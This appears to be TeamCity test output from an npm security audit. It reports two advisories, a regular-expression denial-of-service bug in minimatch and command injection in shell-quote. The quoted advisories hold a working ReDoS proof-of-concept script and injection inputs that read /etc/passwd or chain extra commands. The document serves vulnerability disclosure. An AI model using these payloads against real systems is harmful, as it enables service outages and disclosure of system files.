##teamcity[testStarted name='NSP 118 - minimatch']
##teamcity[testFailed name='NSP 118 - minimatch'message='Regular Expression Denial of Service']
Module: minimatch
Recommendation: Updated to version 3.0.2 or greater
Overview: Minimatch is a minimal matching utility that works by converting glob expressions into JavaScript `RegExp` objects.  The primary function, `minimatch(path, pattern)` is vulnerable to ReDoS in the `pattern` parameter.  This is because of the regular expression on line 521 of minimatch.js: `/((?:\\{2})*)(\\?)\|/g,`.  The problematic portion of the regex is `((?:\\{2})*)` which matches against `//`.

A proof of concept is as follows:
```
var minimatch = require(“minimatch”);

// utility function for generating long strings
var genstr = function (len, chr) {
  var result = “”;
  for (i=0; i<=len; i++) {
    result = result + chr;
  }
  return result;
}

var exploit = “[!” + genstr(1000000, “\\”) + “A”;

// minimatch exploit.
console.log(“starting minimatch”);
minimatch(“foo”, exploit);
console.log(“finishing minimatch”);
```
Installed: 3.0.0
Vulnerable: <=3.0.1
Patched: >=3.0.2
Path: nsp-formatter-checkstyle@1.0.0 > minimatch@3.0.0
More Info: https://nodesecurity.io/advisories/118
##teamcity[testFinished name='NSP 118 - minimatch']
##teamcity[testStarted name='NSP 117 - shell-quote']
##teamcity[testFailed name='NSP 117 - shell-quote'message='Potential Command Injection']
Module: shell-quote
Recommendation: Upgrade to at least version 1.6.1
Overview: The npm module "shell-quote" cannot correctly escape ">" and "<" operator used for redirection in shell. I'm wondering if this might be possible vulnerability for many application which depends on shell-quote.

For example:

   const quote = require('shell-quote').quote;
   console.log(quote(['foo>bar']));

will print "foo>bar", where "foo\>bar" is desirable.

This module is downloaded more than 1M times per month and many other modules are depending on this. If an application is escaping command-line args with this module, they might be vulnerable from malicious user input.

For example:
```
var sq = require('../tests/get/shell-quote-1.6.0');
var exec = require('child_process').exec;

var pattern = process.argv[2];

command = sq.quote(['grep', pattern]));
exec('cat file | ' + command, function ( err, stdout, stderr) {
    console.log(command, stdout);   
});
```
will be vulnerable when user input something like pattern = ':</etc/passwd', which causes the content of /etc/passwd to be leaked.

Internally, (Jon Lamendola, Nick Starke, Jacob Waddell) found that the `;`, `{`, and `}` characters weren't escaped properly either. This allows for full command injection. A malicious user could input `'a;{echo,test,123,234}'` to execute echo fully.
Installed: 1.6.0
Vulnerable: <=1.6.0
Patched: >=1.6.1
Path: nsp-formatter-checkstyle@1.0.0 > shell-quote@1.6.0
More Info: https://nodesecurity.io/advisories/117
##teamcity[testFinished name='NSP 117 - shell-quote']
